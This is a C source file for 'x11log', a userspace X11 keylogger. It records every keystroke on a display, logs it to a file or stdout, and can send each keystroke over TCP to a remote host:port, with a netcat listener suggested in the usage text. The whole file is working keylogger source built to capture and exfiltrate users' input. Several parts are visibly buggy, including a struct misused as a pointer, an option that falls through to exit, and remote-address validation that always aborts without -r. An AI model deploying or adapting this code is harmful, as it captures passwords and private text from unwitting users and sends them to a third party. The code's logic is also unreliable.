/* vim: set ts=4 sw=4: */
/* -- x11log.c
 * x11log - an unprivileged, userspace keylogger for X11
 *
 * This code is licensed under GPLv3.
 * (c) Erik Sonnleitner 2007/2011, es@delta-xi.net
 * www.delta-xi.net
 * */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>      /* signal() */
#include <unistd.h>      /* getopt() */
#include <ctype.h>       /* toupper() */

#include <sys/types.h>   /* time_t */
#include <time.h>        /* time(), localtime(), asctime() */
#include <sys/socket.h>  /* socket(), send() */
#include <netinet/in.h>  /* inet datatypes */
#include <netdb.h>
#include <errno.h>
#include <stdarg.h>      /* variable argument list */

#include <X11/Xlib.h>
#include <X11/X.h>

#include "x11log.h"



/* We only want to detect changed keyboard states, so we declare two keymap
 * arrays (each holding a X keymap vector), whose contents are swapped in each
 * iteration in order to recognize changes. Pointers just for readability. */
static char keymap[2][XKBD_WIDTH],
		*kbd = keymap[0],
		*tmp = keymap[1];

static FILE *output;
static XModifierKeymap *map;
static Display *dsp;
static int silent;


/* Here we go. */
int main (int argc, char ** argv) {
	int i;
	struct tm *timestart;
	struct opts_struct opts;

	timestart = initialize(argc, argv, &opts);

	silent = opts->silent;

	/* NULL defaults to what is given in DISPLAY environment variable. However,
	 * in some cases (e.g. within a VC) this variable is not set; so better go
	 * with :0.0, which is the correct default display in 99% of all cases. This
	 * also works via SSH connections, as long as getuid() user is running X. */
	dsp = XOpenDisplay( (opts.display) ? opts.display : X_DEFAULT_DISPLAY );
	if(!dsp)
		fatal("Cannot open display");

	log(1, "%s\n", "dd");

	XSynchronize (dsp, True);
	map = XGetModifierMapping(dsp);

	XQueryKeymap(dsp, kbd);
	fprintf(output, "\n\n--New Session at %s\n", asctime(timestart));

	/* we'll only try to find changed keys */
	for(;; usleep(DELAY)){
		SWAP(kbd, tmp, char*);
		XQueryKeymap(dsp, kbd);

		for (i = 0; i < XKBD_WIDTH * BYTE_LENGTH; i++)
			if(getbit(kbd, i) != getbit(tmp, i) && getbit(kbd, i)) {
				fprintf(output, "%s", (char*)decodeKey(i, getbit(kbd, i), getMods(kbd)));
				fflush(output);

				if(opts.log_remote)
					transmit_keystroke_inet((char*)decodeKey(i, getbit(kbd, i), getMods(kbd)), &opts);
			}
	}
}

/**
 * Initialization stuff: parse arguments, define signal handlers, define
 * output stream, set default options. Returns time when init() finished.
 * */
struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
	int c;
	time_t rawtime;

	/* connect signals to handler-functions */
	signal(SIGTERM, signal_handler);
	signal(SIGINT, signal_handler);
	signal(SIGHUP, signal_handler);

	/* set default values for cmdline options */
	opts->display = X_DEFAULT_DISPLAY;
	opts->logfile = NULL;
	opts->silent = 0;
	opts->log_remote = 0;
	opts->remote_addr = NULL;
	opts->host = NULL;
	opts->port = 0;

	/* parse cmdline arguments */
	while((c = getopt(argc, argv, "d:f:h?r:s")) != -1){
		switch(c) {
			case 'd':
				opts->display = optarg;
				break;
			case 'f':
				opts->logfile = optarg;
				break;
			case 'r':
				opts->remote_addr = optarg;
				opts->log_remote = 1;
				break;
			case 's':
				opts->silent = 1;
			case 'h':
			case '?':
				fprintf(stderr, " usage: %s [OPTION]\n", argv[0]);
				fprintf(stderr, " Available options:\n");
				fprintf(stderr, "\t-d <DISPLAY>   X-Display to use, default is :0.0\n");
				fprintf(stderr, "\t-f <LOGFILE>   Log keystrokes to file instead of STDOUT. Text is appended; creates file if necessary.\n");
				fprintf(stderr, "\t-r <HOST:PORT> Log keystrokes to remote host. The other end needs a listening daemon on given port\n\t\t\t(e.g. using netcat: 'nc -p <port> -k')\n");
				fprintf(stderr, "\t-s             Be silent (no stdout).\n");

				exit(EXIT_FAILURE);
			default:
				break;
		}
	}

	/* log to file if given, use stdout otherwise  */
	if(opts->logfile == NULL) {
		fprintf(stderr, "Logging to stdout\n");
		output = stdout;
	} else {
		fprintf(stderr, "Logging to file %s\n", opts->logfile);
		output = fopen(opts->logfile, "a");
		if(!output) {
			fprintf(stderr, "Error writing to %s, fallback to console.\n", argv[1]);
			output = stdout;
		}
	}

	/* remote logging argument validation */
	if((opts->remote_addr != NULL)
		&& (strstr(opts->remote_addr, ":") != NULL) && opts->log_remote) {

		opts->host = strtok(opts->remote_addr, ":");
		opts->port = atol( strtok(NULL, ":") );

		if(opts->port <= 0 || opts->port > 65535)
			fatal("Invalid tcp port number");
	} else {
		fatal("Illegal argument for remote logging");
	}


	/* just for logging */
	rawtime = time(NULL);
	return localtime(&rawtime);
}

/**
 * checks keycodes and mods, and returns a human-readable interpretation of the
 * keyboard status.
 * */
char* decodeKey(int code, int down, int mod) {
	static char *str, dump[MAX_KEYLEN + 1];
	int i = 0, remapChar = 0;
	KeySym sym;

	sym = XKeycodeToKeysym(dsp, code, (mod == SHIFT_DOWN) ? True : False);
	if(sym == NoSymbol)
		return "";

	str = XKeysymToString(sym);
	if(!str)
		return "";

	sprintf(dump, "%s", str);

	/* shortenize (remap) char str if in mapping table */
	while (remap[i].src[0]) {
		if (strstr(dump, remap[i].src)) {
			strcpy(dump, remap[i].dst);
			remapChar = 1;
			break;
		}
		i++;
	}

	/* no remapping, but "long" keysym */
	if(dump[1] && !remapChar) {
		(down)
			? sprintf(dump, "%s%s%s", "[+", str, "]")
			: sprintf(dump, "%s%s%s", "[-", str, "]");
		return dump;
	}

	if(mod == CONTROL_DOWN) 
		sprintf(dump, "%c%c%c", '^', dump[0], '\0');

	if(mod == LOCK_DOWN) 
		dump[0] = toupper(dump[0]);

	return dump;
}

/**
 * Read the mod key(s) of the keymap state and return the present mods
 * */
int getMods(char *kbd) {
	int i;
	KeyCode kc;

	for (i = 0; i < map->max_keypermod; i++) {
		kc = map->modifiermap[ControlMapIndex * map->max_keypermod + i];
		if(kc && getbit(kbd, kc))
			return CONTROL_DOWN;

		kc = map->modifiermap[ShiftMapIndex * map->max_keypermod + i];
		if(kc && getbit(kbd, kc))
			return SHIFT_DOWN;

		kc = map->modifiermap[LockMapIndex * map->max_keypermod + i];
		if(kc && getbit(kbd, kc))
			return LOCK_DOWN;
	}

	return 0;
}

/**
 * Retrieve one specific bit (idx) of a keymap vector
 * */
int getbit(char *kbd, int idx) {
	return kbd[idx/8] & (1<<(idx%8));
}


/**
 * Signal handler for SIGTERM, SIGINT and SIGHUP
 * */
void signal_handler(int sig) {
	switch(sig) {
	  //SIGINT and SIGTERM quit application
	  case(SIGINT):
	  case(SIGTERM):
		fprintf(stderr, "\n -- x11log terminated.\n");
		if(output != stdout)
			fclose(output);

		exit(EXIT_SUCCESS);
	  //SIGHUP forces flushing of buffer
	  case(SIGHUP):
		fprintf(stderr, "\n -- SIGHUP: log flushed.\n");
		fflush(output);
	  	return; 
	}
}

/**
 * fatal: Print error message and abort execution.
 * */
void fatal(const char * msg){
	if(msg != NULL)
		fprintf(stderr, "Fatal: %s.\n", msg);
	exit(EXIT_FAILURE);
}

/**
 * transmit keystroke to a remote host, where a daemon in listening mode
 * is required to be running. The connection is established upon every
 * keystroke, which is inefficient, but causes less problems; permanent
 * connection should be tested here.
 * */
int transmit_keystroke_inet(char* key, struct opts_struct *opts){
	int sock, bytes_sent;
	struct hostent *host;
	struct sockaddr_in server_addr;

	host = gethostbyname( opts->host );
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return ERR_SOCKET;

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons( opts->port );
	server_addr.sin_addr = *((struct in_addr *)host->h_addr);
	bzero(&(server_addr.sin_zero),8);

	if(connect(sock,
			(struct sockaddr*)&server_addr, sizeof(struct sockaddr)) == -1)
		return ERR_CONNECT;

	bytes_sent = send(sock, key, strlen(key), 0);
	close(sock);

	return bytes_sent;
}

/**
 * printf() wrapper, taking care of debug levels
 * */
void log(int level, const char *fmt, ...) {
	if(silent)
		return;

	va_list args;
	va_start(args, fmt);
	vfprintf(stdout, fmt, args);
	va_end(args);
}
